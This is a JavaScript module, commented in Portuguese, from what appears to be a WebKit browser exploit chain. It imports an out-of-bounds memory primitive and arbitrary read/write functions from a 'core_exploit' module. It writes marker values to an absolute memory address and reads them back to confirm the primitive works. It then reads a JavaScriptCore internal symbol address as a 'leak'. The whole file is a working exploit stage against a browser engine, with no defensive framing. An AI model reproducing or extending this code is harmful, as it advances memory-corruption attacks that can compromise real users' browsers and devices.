// js/script3/testArrayBufferVictimCrash.mjs (Abordagem v21: Teste de Bloco com Recriação TOTAL de Ambiente em arb_read/write)
import { logS3, PAUSE_S3 } from './s3_utils.mjs';
import { AdvancedInt64, toHex, isAdvancedInt64Object } from '../utils.mjs';
import {
    triggerOOB_primitive, // Usado para a configuração inicial
    clearOOBEnvironment,
    isOOBReady,
    arb_read,  // Do core_exploit.mjs v21 (async, recria ambiente)
    arb_write  // Do core_exploit.mjs v21 (async, recria ambiente)
} from '../core_exploit.mjs'; // CERTIFIQUE-SE DE USAR A VERSÃO v21 ACIMA
import { WEBKIT_LIBRARY_INFO } from '../config.mjs';

export const FNAME_MODULE_V28 = "GetterArbitraryRead_v21_BlockRW_TotalReset";

// === Constantes ===
const TEST_BASE_ABSOLUTE_ADDRESS = new AdvancedInt64(0x00000E00, 0x00000000);
const BLOCK_VALUE_1 = new AdvancedInt64(0xAAAAAAA1, 0x1111111A);
const BLOCK_VALUE_2 = new AdvancedInt64(0xBBBBBBB2, 0x2222222B);
const BLOCK_VALUE_3 = new AdvancedInt64(0xCCCCCCC3, 0x3333333C);
const BLOCK_VALUES = [BLOCK_VALUE_1, BLOCK_VALUE_2, BLOCK_VALUE_3];

// A pausa entre operações pode não ser mais tão necessária se a recriação do ambiente for eficaz, mas manteremos uma pequena.
const PAUSE_BETWEEN_ARB_OPS_MS = 20; 

const ILLUSTRATIVE_CONFIG_DATA_OFFSET_STR = WEBKIT_LIBRARY_INFO.DATA_OFFSETS["JSC::JSArrayBufferView::s_info"];
const ILLUSTRATIVE_CONFIG_ADDRESS_TO_READ = new AdvancedInt64(ILLUSTRATIVE_CONFIG_DATA_OFFSET_STR);

export async function executeArrayBufferVictimCrashTest() {
    const FNAME_CURRENT_TEST = `${FNAME_MODULE_V28}.testArbitraryBlockRWWithTotalReset`;
    logS3(`--- Iniciando ${FNAME_CURRENT_TEST}: Testando L/E de Bloco com Recriação Total de Ambiente ---`, "test", FNAME_CURRENT_TEST);
    document.title = `${FNAME_MODULE_V28} Inic...`;

    let errorCapturedMain = null;
    let exploit_result = {
        success: false,
        base_address_str: TEST_BASE_ABSOLUTE_ADDRESS.toString(true),
        values_written_str: BLOCK_VALUES.map(v => v.toString(true)),
        values_read_back_str: [],
        verification_details: [],
        illustrative_read_address_str: ILLUSTRATIVE_CONFIG_ADDRESS_TO_READ.toString(true),
        illustrative_read_value_str: "N/A",
        message: "Teste não iniciado."
    };

    try {
        // PASSO 1: Inicializar o ambiente OOB uma vez no início.
        // arb_read/arb_write agora chamarão triggerOOB_primitive({force_reinit: true}) internamente.
        await triggerOOB_primitive({ force_reinit: true });
        if (!isOOBReady()) {
            throw new Error("Ambiente OOB inicial não pôde ser configurado.");
        }
        logS3("PASSO 1: Ambiente OOB inicial configurado. Próximas arb_read/write irão recriá-lo.", "info", FNAME_CURRENT_TEST);

        // PASSO 2: Escrever a sequência de valores
        logS3(`PASSO 2: Escrevendo bloco de ${BLOCK_VALUES.length} valores QWORD começando no endereço ${exploit_result.base_address_str}...`, "info", FNAME_CURRENT_TEST);
        for (let i = 0; i < BLOCK_VALUES.length; i++) {
            const current_address = TEST_BASE_ABSOLUTE_ADDRESS.add(i * 8);
            const value_to_write = BLOCK_VALUES[i];
            logS3(`  Escrevendo ${value_to_write.toString(true)} em ${current_address.toString(true)}...`, "info", FNAME_CURRENT_TEST);
            await arb_write(current_address, value_to_write, 8); // USA AWAIT
            await PAUSE_S3(PAUSE_BETWEEN_ARB_OPS_MS);
        }
        logS3(`  Escrita do bloco realizada.`, "info", FNAME_CURRENT_TEST);

        await PAUSE_S3(PAUSE_BETWEEN_ARB_OPS_MS * 2); // Pausa antes de ler o bloco

        // PASSO 3: Ler de volta os valores do bloco individualmente e verificar
        logS3(`PASSO 3: Lendo de volta os valores do bloco individualmente...`, "info", FNAME_CURRENT_TEST);
        let all_values_match = true;
        for (let i = 0; i < BLOCK_VALUES.length; i++) {
            const current_address = TEST_BASE_ABSOLUTE_ADDRESS.add(i * 8);
            const expected_value = BLOCK_VALUES[i];
            
            await PAUSE_S3(PAUSE_BETWEEN_ARB_OPS_MS);
            const read_value_obj = await arb_read(current_address, 8); // USA AWAIT
            const read_value_str = isAdvancedInt64Object(read_value_obj) ? read_value_obj.toString(true) : "ERRO_LEITURA_BLOCO";
            exploit_result.values_read_back_str.push(read_value_str);
            
            const verification_msg = `  Lido de ${current_address.toString(true)}: ${read_value_str} (Esperado: ${expected_value.toString(true)})`;
            if (read_value_str === expected_value.toString(true)) {
                logS3(verification_msg + " - CORRETO!", "good", FNAME_CURRENT_TEST);
                exploit_result.verification_details.push({offset: i*8, read: read_value_str, expected: expected_value.toString(true), match: true});
            } else {
                logS3(verification_msg + " - INCORRETO!", "error", FNAME_CURRENT_TEST);
                exploit_result.verification_details.push({offset: i*8, read: read_value_str, expected: expected_value.toString(true), match: false});
                all_values_match = false;
            }
        }

        if (!all_values_match) {
            exploit_result.message = `Falha na verificação do bloco de dados em ${exploit_result.base_address_str} (com recriação total de ambiente).`;
        } else {
            exploit_result.success = true;
            exploit_result.message = `SUCESSO! Bloco de dados escrito e lido corretamente do endereço base ${exploit_result.base_address_str} (com recriação total de ambiente).`;
        }
        
        // PASSO 4: Leitura Ilustrativa
        logS3(`PASSO 4: Leitura ilustrativa do endereço ${exploit_result.illustrative_read_address_str} (de config.mjs)...`, "info", FNAME_CURRENT_TEST);
        try {
            await PAUSE_S3(PAUSE_BETWEEN_ARB_OPS_MS);
            const illustrative_read_obj = await arb_read(ILLUSTRATIVE_CONFIG_ADDRESS_TO_READ, 8); // USA AWAIT
            exploit_result.illustrative_read_value_str = isAdvancedInt64Object(illustrative_read_obj) ? illustrative_read_obj.toString(true) : "ERRO_LEITURA_ILUSTRATIVA";
            logS3(`  Valor lido do endereço ${exploit_result.illustrative_read_address_str}: ${exploit_result.illustrative_read_value_str}`, "leak", FNAME_CURRENT_TEST);
        } catch (e_illustrative) {
            exploit_result.illustrative_read_value_str = `ERRO_LEITURA_ILUSTRATIVA: ${e_illustrative.message}`;
            logS3(`  ERRO na leitura ilustrativa: ${e_illustrative.message}`, "error", FNAME_CURRENT_TEST);
        }
        
        if (exploit_result.success) {
            logS3(`  !!!! ${exploit_result.message} !!!!`, "vuln", FNAME_CURRENT_TEST);
            document.title = `${FNAME_MODULE_V28}: ARB BLOCK TOTALRESET OK!`;
        } else {
            logS3(exploit_result.message, "error", FNAME_CURRENT_TEST);
            document.title = `${FNAME_MODULE_V28}: Falha Bloco (TotalReset)`;
        }

    } catch (e_outer_main) {
        errorCapturedMain = e_outer_main;
        logS3(`ERRO CRÍTICO GERAL: ${e_outer_main.name} - ${e_outer_main.message}`, "critical", FNAME_CURRENT_TEST);
        if (e_outer_main.stack) logS3(`Stack: ${e_outer_main.stack}`, "critical", FNAME_CURRENT_TEST);
        exploit_result.message = `Erro geral: ${e_outer_main.name} - ${e_outer_main.message}`;
        document.title = `${FNAME_MODULE_V28} ERRO CRÍTICO`;
        exploit_result.success = false;
    } finally {
        clearOOBEnvironment({force_clear_even_if_not_setup: true});
        logS3(`--- ${FNAME_CURRENT_TEST} Concluído ---`, "test", FNAME_CURRENT_TEST);
        logS3(`Resultado Teste L/E de Bloco com Recriação Total (v21): Success=${exploit_result.success}, Msg='${exploit_result.message}'`, exploit_result.success ? "good" : "warn", FNAME_CURRENT_TEST);
        logS3(`  Endereço Base Bloco: ${exploit_result.base_address_str}`, "info", FNAME_CURRENT_TEST);
        exploit_result.verification_details.forEach(detail => {
            logS3(`    Verificação Bloco Offset +${detail.offset}: Lido=${detail.read}, Esperado=${detail.expected}, Match=${detail.match}`, detail.match ? "debug" : "error", FNAME_CURRENT_TEST);
        });
        logS3(`  Leitura Ilustrativa de ${exploit_result.illustrative_read_address_str}: ${exploit_result.illustrative_read_value_str}`, "info", FNAME_CURRENT_TEST);
    }

    return {
        errorOccurred: errorCapturedMain,
        exploit_attempt_result: exploit_result,
    };
}
